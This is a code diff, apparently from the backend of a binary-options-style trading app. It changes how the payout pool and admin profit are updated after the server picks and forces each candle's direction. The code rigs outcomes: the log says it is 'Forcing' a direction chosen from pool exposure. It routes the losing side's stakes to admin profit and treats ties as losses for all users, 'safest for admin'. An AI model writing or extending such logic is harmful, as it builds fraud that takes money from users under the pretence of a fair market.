@@ -273,10 +273,25 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
                 newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
                 newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00005);
                 
-                // Deduct payout from pool instantly if users are about to win
-                const finalWinningPayout = targetDirection === 'GREEN' ? immediateUpPayout : (targetDirection === 'RED' ? immediateDownPayout : 0);
-                if (finalWinningPayout > 0) {
-                    updateGlobalPoolInDB(-finalWinningPayout, 0); // Remove winning amount from pool
+                // Deduct payout from pool for winners, and move loser's money to admin profit
+                let payoutChange = 0;
+                let adminProfitChange = 0;
+
+                if (targetDirection === 'GREEN') {
+                    // UP direction wins
+                    payoutChange = -immediateUpPayout; // Deduct from payout pool
+                    adminProfitChange = immediateDownVol; // Down direction's invested amount moves to admin profit
+                } else if (targetDirection === 'RED') {
+                    // DOWN direction wins
+                    payoutChange = -immediateDownPayout; // Deduct from payout pool
+                    adminProfitChange = immediateUpVol; // Up direction's invested amount moves to admin profit
+                } else {
+                    // In case of a DOJI or unexpected state, consider it a loss for both (safest for admin)
+                    adminProfitChange = immediateUpVol + immediateDownVol;
+                }
+
+                if (payoutChange !== 0 || adminProfitChange !== 0) {
+                    updateGlobalPoolInDB(payoutChange, adminProfitChange);
                 }
 
                 console.log(`[AUTO-PILOT IMMEDIATE] Pool: $${globalPayoutPool.toFixed(2)}. U-Pay: $${immediateUpPayout} D-Pay: $${immediateDownPayout}. Forcing ${targetDirection}`);
